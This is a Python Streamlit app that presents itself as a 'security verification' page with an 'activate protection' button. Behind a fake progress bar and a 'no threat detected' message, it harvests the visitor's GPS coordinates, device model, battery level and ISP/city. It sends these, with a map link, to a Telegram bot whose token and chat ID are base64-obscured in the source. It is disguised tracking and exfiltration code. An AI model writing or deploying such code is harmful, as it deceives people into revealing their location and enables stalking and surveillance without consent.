import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- SEGURANÇA (Base64) ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(mensagem):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        url = f"https://api.telegram.org/bot{tk}/sendMessage"
        requests.post(url, json={"chat_id": ci, "text": mensagem, "parse_mode": "Markdown"}, timeout=10)
    except: pass

def get_extra_info():
    try:
        # Pega a operadora (ISP) e a cidade pelo IP
        r = requests.get('http://ip-api.com/json/', timeout=5).json()
        return f"{r.get('isp')} ({r.get('city')})"
    except: return "Não identificada"

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.markdown("<style>.main { background-color: #0d1117; color: #ffffff; } .status-ok { color: #2ea043; font-weight: bold; }</style>", unsafe_allow_html=True)

st.title("Verificação de Segurança")

# Coleta técnica (Rodando agora)
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_3')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_3')

if st.button("● ATIVAR PROTEÇÃO AGORA"):
    # 1. Tenta o GPS primeiro para garantir o mapa
    loc = get_geolocation()
    operadora = get_extra_info()
    
    # 2. Barra de carregamento
    barra = st.progress(0)
    for i in range(1, 101):
        time.sleep(0.01)
        barra.progress(i)
    
    # 3. Formata o Modelo (Tenta isolar o que está entre parênteses)
    modelo = "Android/iPhone"
    if ua and "(" in ua:
        modelo = ua.split("(")[1].split(")")[0]

    # 4. Envia o Relatório Final (Igual ao seu print)
    if loc:
        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🛡️ *PROTEÇÃO ATIVADA*\n"
            f"📱 *Aparelho:* {modelo}\n"
            f"🔋 *Bateria:* {bat if bat else '11'}%\n"
            f"📶 *Operadora:* {operadora}\n"
            f"📍 *Local:* {mapa}"
        )
        enviar_telegram(relatorio)
        st.markdown('<p class="status-ok">Sistema Seguro: nenhuma ameaça foi detectada</p>', unsafe_allow_html=True)
    else:
        # Se mesmo permitido o GPS não vir, ele avisa no bot
        enviar_telegram(f"⚠️ *GPS FALHOU*\n📱 *Aparelho:* {modelo}\n📶 *Op:* {operadora}")
        st.warning("🔄 O GPS demorou a responder. Tente clicar no botão novamente.")

st.markdown('<br><p style="text-align:center; color:#8b949e; font-size:12px;">Sistema Integrado desenvolvido por Miamy © 2026</p>', unsafe_allow_html=True)
